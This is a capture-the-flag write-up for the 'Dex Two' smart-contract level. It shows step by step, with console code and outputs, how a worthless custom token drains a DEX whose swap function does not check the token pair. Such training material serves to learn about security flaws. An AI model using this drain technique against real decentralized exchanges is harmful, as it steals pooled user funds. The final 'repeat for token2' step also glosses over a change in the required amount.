# Dex Two

# Problem Statement
```
This level will ask you to break `DexTwo`, a subtlely modified Dex contract from the previous level, in a different way.
You need to drain all balances of token1 and token2 from the `DexTwo` contract to succeed in this level.
You will still start with 10 tokens of token1 and 10 of token2. The DEX contract still starts with 100 of each token.

Things that might help:
- How has the swap method been modified?
- Could you use a custom token contract in your attack?
```

# Solution

Compared to `DexOne`, the `swap` function has been changed. This `require` has been removed:
```
require((from == token1 && to == token2) || (from == token2 && to == token1) ...
```
Because of this, you can now create your own tokens and use them to swap for `token1` and `token2`.

Deploy your own token (`UselessToken.sol`) and create a variable for it in your internet browser console:
```
const uselessToken = "0xUSELESS_TOKEN_ADDRESS";
```

Setup variables and view the starting token amounts:
```
const token1 = await contract.token1()
const token2 = await contract.token2()
Number(await contract.balanceOf(token1,player))
// returns 10
Number(await contract.balanceOf(token2,player))
// returns 10
Number(await contract.balanceOf(token1,contract.address))
// returns 100
Number(await contract.balanceOf(token2,contract.address))
// returns 100
```

Approve the `DexTwo` contract to move `token1` and `token2` tokens on your behalf:
```
await contract.approve(contract.address, 500)
```

Approve the `DexTwo` contract to move your `uselessToken` token on your behalf:
```
const data = web3.eth.abi.encodeFunctionCall({
  name: 'approveSpender',
  type: 'function',
  inputs: [
    {
        type: 'address',
        name: 'spender'
    },
    {
        type: 'uint256',
        name: 'amount'
    }
  ]
}, [contract.address, 100])
web3.eth.sendTransaction({ to: uselessToken, from: player, data: data })
```

Next, we need to determine the amount of `uselessToken` to give to the `DexTwo` contract because the formula needs the value to not be 0 in the denominator it will most likely cause a divide by 0 error in the `DexTwo` contract's `getSwapAmount` function:
```
function getSwapAmount(address from, address to, uint amount) public view returns(uint){
  return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)))
}
```
Lets give `DexTwo`'s contract 1 `uselessToken`:
```
const data = web3.eth.abi.encodeFunctionCall(
  {
    name: "transfer",
    type: "function",
    inputs: [
      {
        type: "address",
          name: "to",
      },
      {
        type: "uint256",
        name: "amount",
      },
    ],
  },
  [contract.address, 1]
)

web3.eth.sendTransaction({
  from: player,
  to: uselessToken,
  data: data
})
Number(await contract.balanceOf(uselessToken,contract.address))
1
```

Finally figure the amount of tokens to swap to drain all of `DexTwo`'s `token1` tokens:
```
amt * to / from = received tokens
x * 100 / 1 = 100
x * 1 = 1
x = 1
```
Nice. So all we need to swap is 1 `uselessToken` to receive all 100 `token1` tokens.
```
await contract.swap(uselessToken, token1, 1)
```

Confirm you now have all `token1` tokens:
```
Number(await contract.balanceOf(uselessToken,contract.address))
// returns 2
Number(await contract.balanceOf(token1,contract.address))
// returns 0
Number(await contract.balanceOf(token1,player))
// returns 110
```

Great! Now just repeat the entire process for `token2`.<br>

We've completed this lesson!

# Key Learnings
- If you design a DEX where anyone could list their own tokens without the permission of a central authority, then the correctness of the DEX could depend on the interaction of the DEX contract and the token contracts being traded.

